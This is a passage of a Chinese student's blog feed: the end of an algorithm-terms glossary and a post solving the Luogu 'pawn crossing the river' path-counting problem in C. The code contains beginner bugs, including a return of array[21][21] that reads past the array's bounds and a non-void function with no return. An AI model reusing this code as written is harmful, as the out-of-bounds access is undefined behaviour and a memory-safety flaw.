Embedding</td><td>平面性检测和嵌入</td></tr><tr><td>Point Location</td><td>位置查询</td></tr><tr><td>Polygon Partitioning</td><td>多边形分割</td></tr><tr><td>Priority Queues</td><td>优先队列</td></tr><tr><td>Random Number Generation</td><td>随机数生成</td></tr><tr><td>Range Search</td><td>范围查询</td></tr><tr><td>rate of convergence</td><td>收敛速度</td></tr><tr><td>robustness</td><td>鲁棒性</td></tr><tr><td>Satisfiability</td><td>可满足性</td></tr><tr><td>Searching</td><td>查找</td></tr><tr><td>Set and String Problems</td><td>集合与串的问题</td></tr><tr><td>Set Cover</td><td>集合覆盖</td></tr><tr><td>Set Data Structures</td><td>集合</td></tr><tr><td>Shape Similarity</td><td>相似多边形</td></tr><tr><td>Shortest Common Superstring</td><td>最短公共父串</td></tr><tr><td>Shortest Path</td><td>最短路径</td></tr><tr><td>Simplifying Polygons</td><td>多边形化简</td></tr><tr><td>Solving Linear Equations</td><td>线性方程组</td></tr><tr><td>Sorting</td><td>排序</td></tr><tr><td>Steiner Tree</td><td>Steiner树</td></tr><tr><td>String Matching</td><td>模式匹配</td></tr><tr><td>Text Compression</td><td>压缩</td></tr><tr><td>Topological Sorting</td><td>拓扑排序</td></tr><tr><td>Transitive Closure and Reduction</td><td>传递闭包</td></tr><tr><td>Traveling Salesman Problem</td><td>旅行商问题</td></tr><tr><td>Triangulation</td><td>三角剖分</td></tr><tr><td>Vertex Coloring</td><td>点染色</td></tr><tr><td>Vertex Cover</td><td>点覆盖</td></tr><tr><td>Voronoi Diagrams</td><td>Voronoi图</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="术语" scheme="http://chenxiyuan.vip/tags/%E6%9C%AF%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>过河卒问题</title>
    <link href="http://chenxiyuan.vip/2018/11/01/%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/01/过河卒问题/</id>
    <published>2018-11-01T12:21:16.000Z</published>
    <updated>2018-11-02T07:26:34.557Z</updated>
    
    <content type="html"><![CDATA[<p>学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。<br><img src="http://i2.tiimg.com/665720/d0a9f9971eb168e0.png" alt="过河卒问题"><br><img src="http://i2.tiimg.com/665720/926f53a9ceaee312.png" alt="过河卒问题"><br><a id="more"></a></p><h2 id="我的心路历程"><a href="#我的心路历程" class="headerlink" title="我的心路历程"></a>我的心路历程</h2><p>首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。<br>我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。<br>当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。</p><h2 id="我的代码"><a href="#我的代码" class="headerlink" title="我的代码"></a>我的代码</h2><p>先附上我的遍历方法，学会更好的方法再补充。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">define_horse_control1</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>],<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><span class="comment">//定义一个函数，把马控制的点赋为0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">array</span>[x][y]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">0</span>&amp;&amp;y<span class="number">-1</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x<span class="number">-2</span>][y<span class="number">-1</span>]=<span class="number">0</span>;<span class="comment">//这里都要判断一下有没有越界 </span></span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">0</span>&amp;&amp;y+<span class="number">1</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x<span class="number">-2</span>][y+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;y<span class="number">-2</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x<span class="number">-1</span>][y<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;y<span class="number">-2</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x+<span class="number">1</span>][y<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">2</span>&lt;=<span class="number">20</span>&amp;&amp;y<span class="number">-1</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x+<span class="number">2</span>][y<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(y+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;x+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x+<span class="number">2</span>][y+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;y+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x<span class="number">-1</span>][y+<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;y+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x+<span class="number">1</span>][y+<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">define_horse_control2</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>],<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span><span class="comment">//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>==<span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-1</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=y+<span class="number">1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-2</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-2</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=y+<span class="number">2</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-1</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-2</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">2</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-2</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n,x,y;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;m,&amp;n,&amp;x,&amp;y);</span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">1</span>;<span class="comment">//到达第一行第一列的点都只有一条路径，都赋值为1</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//到达第一行第一列的点都只有一条路径，都赋值为1</span></span><br><span class="line">define_horse_control1(a,x,y);<span class="comment">//把马控制的点赋为0</span></span><br><span class="line">define_horse_control2(a,x,y,n,m);<span class="comment">//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)<span class="comment">//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i==x<span class="number">-2</span>&amp;&amp;j==y<span class="number">-1</span>)||(i==x<span class="number">-2</span>&amp;&amp;j==y+<span class="number">1</span>)||(i==x<span class="number">-1</span>&amp;&amp;j==y<span class="number">-2</span>)||(i==x+<span class="number">1</span>&amp;&amp;j==y<span class="number">-2</span>)||(i==x+<span class="number">2</span>&amp;&amp;j==y<span class="number">-1</span>)||(j==y+<span class="number">1</span>&amp;&amp;i==x+<span class="number">2</span>)||(i==x<span class="number">-1</span>&amp;&amp;j==y+<span class="number">2</span>)||(i==x+<span class="number">1</span>&amp;&amp;j==y+<span class="number">2</span>)||(i==x&amp;&amp;j==y))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//跳过马的控制点的计算 </span></span><br><span class="line">&#125;</span><br><span class="line">a[i][j]=a[i][j<span class="number">-1</span>]+a[i<span class="number">-1</span>][j];<span class="comment">//当前坐标的路径数等于左边和上边路径数之和</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,a[m][n]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/d0a9f9971eb168e0.png&quot; alt=&quot;过河卒问题&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/926f53a9ceaee312.png&quot; alt=&quot;过河卒问题&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
</feed>
